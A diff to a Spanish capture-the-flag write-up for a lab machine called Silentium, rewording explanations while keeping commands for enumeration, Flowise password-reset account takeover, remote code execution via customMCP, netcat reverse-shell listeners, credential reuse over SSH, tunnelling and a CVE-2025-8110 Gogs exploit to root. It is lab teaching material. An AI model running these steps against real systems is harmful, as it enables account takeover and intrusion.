@@ -28,13 +28,13 @@ summary: "Cadena de explotación: descubrimiento de un entorno Flowise en stagin
 
 El primer objetivo fue confirmar la superficie mínima expuesta y verificar si la web dependía de nombres virtuales. La combinación `22/tcp` + `80/tcp` ya sugería un flujo clásico de enumeración web con posible acceso posterior por SSH.
 
-Este escaneo inicial sirve para detectar rápidamente los puertos abiertos y descartar ruido.
+Escaneamos puertos abiertos y descubrimos que solo 22/tcp y 80/tcp respondían.
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn 10.129.28.251
 ```
 
-Con los puertos localizados, este segundo escaneo profundiza en banners, versiones y redirecciones útiles para orientar la enumeración.
+Con los puertos localizados, escaneamos banners y versiones, confirmando OpenSSH y la redirección a `silentium.htb`.
 
 ```bash
 nmap -p22,80 -sCV 10.129.28.251
@@ -50,7 +50,7 @@ Indicadores relevantes de esta fase:
 
 Primero convenía medir si el sitio principal tenía rutas interesantes antes de saltar a hipótesis más complejas.
 
-Este comando enumera directorios visibles en el virtual host principal.
+Fuzzeamos directorios en el virtual host principal, pero los resultados fueron mínimos.
 
 ```bash
 gobuster dir -u http://silentium.htb \
@@ -58,9 +58,9 @@ gobuster dir -u http://silentium.htb \
   -t 200 --exclude-length 8753
 ```
 
-El resultado útil fue mínimo, así que el esfuerzo pasó a subdominios. Ese cambio de foco fue el punto correcto: el comportamiento de la web principal parecía deliberadamente austero.
+El comportamiento de la web principal era deliberadamente austero, así que pasamos a fuzzear subdominios.
 
-Este comando fuzzea virtual hosts usando el mismo dominio base y filtra respuestas repetidas.
+Fuzzeamos virtual hosts y descubrimos `staging.silentium.htb`.
 
 ```bash
 wfuzz -H "Host: FUZZ.silentium.htb" --hc 404,403 --hh=178 \
@@ -72,15 +72,15 @@ Subdominio relevante:
 
 - `staging.silentium.htb`
 
-Una vez hallado el entorno `staging`, lo importante era identificar rápidamente la tecnología detrás de la SPA.
+Antes de inspeccionar la SPA, probamos fuzzing de directorios sobre staging, pero no encontramos nada fuera de lo esperado.
 
-Este comando descarga la portada para inspeccionar referencias a JavaScript y metadatos del frontend.
+Una vez hallado el entorno `staging`, descargamos la portada para identificar la tecnología.
 
 ```bash
 curl -s http://staging.silentium.htb | tee index.html
 ```
 
-Este comando extrae del HTML el bundle principal que luego conviene revisar.
+Del HTML extrajimos el bundle principal para revisar su contenido.
 
 ```bash
 grep -i js index.html
@@ -88,13 +88,13 @@ grep -i js index.html
 
 El código cliente y el `view-source` dejaban una pista muy clara: el entorno corría **FlowiseAI**.
 
-Este comando descarga el bundle JavaScript para buscar rutas API embebidas.
+Descargamos el bundle JavaScript para buscar rutas API embebidas.
 
 ```bash
 curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js -o main.js
 ```
 
-Este comando extrae endpoints `/api/v1/` visibles en el bundle y ayuda a priorizar superficies reales del backend.
+Extraímos endpoints `/api/v1/` del bundle y descubrimos rutas como `version` y `account/forgot-password`.
 
 ```bash
 grep -oE '/api/v1/[a-zA-Z0-9_/.-]*' main.js | sort -u
@@ -102,7 +102,7 @@ grep -oE '/api/v1/[a-zA-Z0-9_/.-]*' main.js | sort -u
 
 El endpoint más útil para perfilar la versión era `version`.
 
-Este comando consulta la versión expuesta por la API y confirma el producto objetivo.
+Consultamos la API de versiones y confirmamos Flowise 3.0.5.
 
 ```bash
 curl -s http://staging.silentium.htb/api/v1/version
@@ -118,7 +118,7 @@ Salida relevante:
 
 Con Flowise identificado, el siguiente paso lógico fue revisar endpoints de autenticación y recuperación de acceso. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.
 
-Este comando enumera rutas adicionales bajo `/api/v1/` para descubrir superficies no visibles en el bundle inicial.
+Fuzzeamos rutas adicionales bajo `/api/v1/` y descubrimos `account/forgot-password`.
 
 ```bash
 gobuster dir -u http://staging.silentium.htb/api/v1/ \
@@ -128,7 +128,7 @@ gobuster dir -u http://staging.silentium.htb/api/v1/ \
 
 La ruta especialmente interesante fue `account/forgot-password`, porque permite diferenciar usuarios válidos frente a inexistentes.
 
-Este comando prueba el flujo de recuperación con un correo arbitrario para entender el comportamiento de error.
+Probamos el flujo de recuperación con un correo arbitrario y confirmamos que la API diferenciaba usuarios válidos de inexistentes.
 
 ```bash
 curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
@@ -138,7 +138,7 @@ curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
 
 Una vez validado el patrón, se podía usar fuzzing para descubrir una cuenta real.
 
-Este comando enumera nombres de usuario contra el flujo de reseteo y filtra respuestas negativas.
+Fuzzeamos nombres de usuario contra el reseteo y descubrimos `ben@silentium.htb`.
 
 ```bash
 wfuzz -z file,/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
@@ -155,7 +155,7 @@ Usuario identificado:
 
 El hallazgo crítico aparece al repetir el flujo con la cuenta válida: la respuesta devuelve datos sensibles del usuario, incluyendo un `tempToken` reutilizable para resetear la contraseña.
 
-Este comando invoca el reseteo sobre la cuenta válida y evidencia la fuga de información sensible.
+Invocamos el reseteo sobre `ben` y descubrimos que la API devolvía un `tempToken` reutilizable.
 
 ```bash
 curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
@@ -178,7 +178,7 @@ Salida relevante, con valores sensibles redactados:
 
 Con ese `tempToken`, el takeover era directo.
 
-Este comando completa el cambio de contraseña usando el token temporal expuesto por la propia API.
+Con el `tempToken`, cambiamos la contraseña de `ben` y tomamos control de la cuenta.
 
 ```bash
 curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
@@ -200,7 +200,7 @@ Con la cuenta comprometida, el siguiente objetivo fue convertir acceso a panel e
 
 Las notas originales incluyen una referencia a una CVE en esta fase, pero no dejan evidencia suficiente para atribuir con rigor un identificador concreto solo a partir del material conservado. Por eso la omito y me centro en el comportamiento observado.
 
-Este comando prueba ejecución de código a través del endpoint `node-load-method/customMCP` usando una API key válida obtenida tras el takeover de la cuenta.
+Probamos ejecución de código a través de `node-load-method/customMCP` y logramos ejecutar comandos en el contenedor.
 
 ```bash
 curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
@@ -216,7 +216,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 Para confirmar la salida de red desde el objetivo, bastaba exponer un servidor HTTP simple en la máquina atacante.
 
-Este comando levanta un servidor web temporal para verificar el callback del proceso ejecutado en el contenedor.
+Pusimos un servidor HTTP temporal para capturar el callback del contenedor y confirmar la ejecución.
 
 ```bash
 python3 -m http.server 80
@@ -224,13 +224,13 @@ python3 -m http.server 80
 
 Con la ejecución verificada, el siguiente paso fue pedir una reverse shell.
 
-Este comando prepara un listener para recibir la conexión inversa desde el entorno Flowise.
+Preparamos un listener para recibir la shell inversa desde el contenedor Flowise.
 
 ```bash
 nc -nlvp 4444
 ```
 
-Este comando reemplaza la prueba HTTP por una shell inversa a través del mismo vector `customMCP`.
+Reemplazamos la prueba HTTP por una shell inversa dirigida a nuestro listener.
 
 ```bash
 curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
@@ -246,7 +246,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 La shell recibida no pertenecía todavía al host principal, sino al contenedor de la aplicación. El dato decisivo estaba en el entorno: credenciales operativas reutilizadas fuera de Flowise.
 
-Este comando imprime variables de entorno para buscar secretos y contexto de despliegue dentro del contenedor.
+Inspeccionamos las variables de entorno en el contenedor y encontramos credenciales reutilizadas.
 
 ```bash
 env
@@ -266,7 +266,7 @@ JWT_REFRESH_TOKEN_SECRET=[REDACTED]
 
 La reutilización más útil fue `FLOWISE_PASSWORD`, porque la cuenta `ben` existía también en el sistema Linux. Antes de perder tiempo con más escape de contenedor, tenía más sentido validar directamente SSH.
 
-Este comando intenta autenticarse al host con la cuenta del sistema usando la credencial reutilizada encontrada en el contenedor.
+Probamos `FLOWISE_PASSWORD` como SSH de `ben` y accedimos directamente al host.
 
 ```bash
 ssh ben@silentium.htb
@@ -278,7 +278,7 @@ La sesión abre correctamente como `ben`, lo que confirma reutilización de cred
 
 Ya dentro del host, lo correcto era revisar puertos locales y servicios no publicados externamente antes de insistir con SUIDs o vectores genéricos.
 
-Este comando enumera servicios en escucha para localizar paneles internos accesibles solo desde localhost.
+Listamos servicios en escucha en el host y descubrimos Gogs (`3001`) y MailHog (`8025`) en localhost.
 
 ```bash
 ss -tulnp
@@ -291,7 +291,7 @@ Hallazgos útiles:
 
 Antes de priorizar Gogs, convenía validar rápidamente si `8025` aportaba credenciales o enlaces de reseteo.
 
-Este comando reenvía el puerto local `8025` hacia la consola MailHog del objetivo.
+Reenviamos `8025` por túnel SSH pero el buzón de MailHog estaba vacío — no aportó valor.
 
 ```bash
 ssh -L 8025:127.0.0.1:8025 ben@silentium.htb
@@ -303,7 +303,7 @@ La consola confirmó que se trataba de MailHog, pero el buzón estaba vacío y n
 
 La pista realmente prometedora era `3001`, porque los artefactos del sistema apuntaban a una instalación local de **Gogs**.
 
-Este comando busca directorios asociados a Gogs para confirmar la tecnología y su ubicación de despliegue.
+Buscamos directorios de Gogs y confirmamos su instalación local.
 
 ```bash
 find / -path "*gogs*" -type d 2>/dev/null
@@ -311,7 +311,7 @@ find / -path "*gogs*" -type d 2>/dev/null
 
 Para interactuar con el servicio interno desde la máquina atacante sin tocar el firewall del objetivo, lo más limpio era usar tunelización SSH.
 
-Este comando reenvía el puerto local `3001` hacia el Gogs interno del objetivo.
+Reenviamos `3001` por túnel SSH y accedimos al Gogs interno desde nuestra máquina.
 
 ```bash
 ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
@@ -337,7 +337,7 @@ Una vez creada la cuenta, se generó un token de acceso personal. La captura se 
 
 Antes de lanzar la PoC, hacía falta preparar un listener para la reverse shell resultante.
 
-Este comando levanta un listener con `rlwrap` para recibir una shell más cómoda desde el proceso explotado en Gogs.
+Preparamos un listener con `rlwrap` para recibir la shell del exploit.
 
 ```bash
 rlwrap nc -lnvp 4444
@@ -345,7 +345,7 @@ rlwrap nc -lnvp 4444
 
 Después, se ejecuta la PoC contra el Gogs interno usando un token API válido. El token se muestra redactado.
 
-Este comando lanza el exploit de `CVE-2025-8110` contra la instancia interna de Gogs tunelizada por SSH.
+Lanzamos el exploit de `CVE-2025-8110`, que creó un symlink y ejecutó nuestra reverse shell como `root`.
 
 ```bash
 python3 exploit.py \
@@ -359,7 +359,7 @@ La PoC crea un repositorio, sube un symlink a `.git/config`, sobrescribe `sshCom
 
 Con acceso a `root`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.
 
-Este comando lee la flag de `root` desde el host comprometido.
+Leímos la flag de `root` para completar la máquina.
 
 ```bash
 cat /root/root.txt
